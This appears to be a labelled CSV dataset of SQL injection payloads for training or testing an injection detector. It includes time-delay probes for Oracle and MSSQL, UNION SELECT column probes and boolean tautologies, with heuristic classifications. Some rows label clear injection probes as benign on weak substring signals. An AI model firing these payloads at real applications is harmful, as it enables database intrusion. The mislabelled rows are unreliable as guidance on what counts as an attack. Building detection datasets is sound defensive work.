id,payload_inner,sqli_type,db_engine,confidence,reasoning,sources_agree
24434,"1 and 6537 = dbms_pipe.receive_message ( chr ( 76 ) ||chr ( 116 ) ||chr ( 117 ) ||chr ( 65 ) ,5 ) # dbzk",time_blind,oracle,1.0,"Signals: 'dbms_pipe', 'chr'; Time-blind SQLi (sleep/delay function); DB: oracle",2
24453,1 ) ) as dhqt where 8485 = 8485 waitfor delay '0:0:5'--,time_blind,mssql,0.9,Signals: 'waitfor'; Time-blind SQLi (sleep/delay function); DB: mssql,2
24469,"-7107"" ) ) ) order by 1#",benign,mysql,0.9,Signals: 'ord'; DB: mysql. Payload length: 24 chars.,2
24477,-7273%' ) ) order by 1#,benign,mysql,0.9,Signals: 'ord'; DB: mysql. Payload length: 23 chars.,2
24496,"-9737"" ) ) ) order by 1--",benign,mysql,0.9,Signals: 'ord'; DB: mysql. Payload length: 25 chars.,2
24517,"iif ( 1718 = 5436,1,1/0 )",benign,mysql,0.9,Signals: 'if'; DB: mysql. Payload length: 25 chars.,2
24406,-7552 or 6872 = 6872,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 20 chars.,2
24422,"-2296"" union all select 7359,7359,7359,7359,7359,7359#",union_based,generic,0.7,UNION-based payload detected. Payload length: 54 chars.,2
24423,"-8106%"" ) union all select 2051,2051,2051,2051,2051,2051#",union_based,generic,0.7,UNION-based payload detected. Payload length: 57 chars.,2
24431,"-5275%' ) ) union all select 9382,9382,9382,9382,9382,9382,9382,9382,9382,9382--",union_based,generic,0.7,UNION-based payload detected. Payload length: 80 chars.,2
24436,1' ) ) and 9198 = 9198--,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 24 chars.,2
24440,-4171' ) union all select 6136#,union_based,generic,0.7,UNION-based payload detected. Payload length: 31 chars.,2
24444,"-5738"" ) as efbn where 8541 = 8541 union all select 8541,8541,8541,8541,8541,8541,8541,8541#",union_based,generic,0.7,UNION-based payload detected. Payload length: 92 chars.,2
24454,"-1059"" ) union all select 1276,1276,1276,1276,1276,1276,1276,1276#",union_based,generic,0.7,UNION-based payload detected. Payload length: 66 chars.,2
24455,"-3377"" ) or 4982 = 6608#",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 24 chars.,2
24456,"-7676"" ) ) as flov where 7967 = 7967 union all select 7967--",union_based,generic,0.7,UNION-based payload detected. Payload length: 60 chars.,2
